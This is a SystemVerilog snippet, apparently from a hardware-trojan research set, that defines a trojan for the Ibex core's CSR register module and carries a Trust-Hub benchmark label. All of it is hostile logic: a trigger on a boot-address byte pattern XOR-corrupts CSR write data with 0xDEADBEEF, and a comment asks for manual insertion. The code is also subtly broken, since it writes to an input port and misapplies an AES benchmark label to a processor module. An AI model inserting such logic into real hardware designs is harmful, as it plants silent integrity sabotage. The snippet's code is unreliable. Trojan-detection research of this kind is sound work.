
// ========== TROJAN T4: Integrity Violation ==========
// Trust-Hub AES-T800
// Module: ibex_cs_registers
// Type: Sequential
// Description: Corrupts csr_wdata_i when specific pattern detected

// Trojan trigger
logic trojan_T4_trigger;
assign trojan_T4_trigger = (boot_addr_i) && 
                                     (boot_addr_i[7:0] == 8'hDE);  // Trigger pattern

// Trojan corruption pattern
logic [31:0] trojan_T4_corrupt;
assign trojan_T4_corrupt = 32'hDEADBEEF;

// Trojan logic
always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        // Normal reset
    end else begin
        if (trojan_T4_trigger) begin
            csr_wdata_i <= csr_wdata_i ^ trojan_T4_corrupt;  // Corrupt data
        end
    end
end

// MANUAL INSERTION REQUIRED:
// Add XOR corruption to the always_ff block where csr_wdata_i is assigned.

// ========== TROJAN T4 END ==========
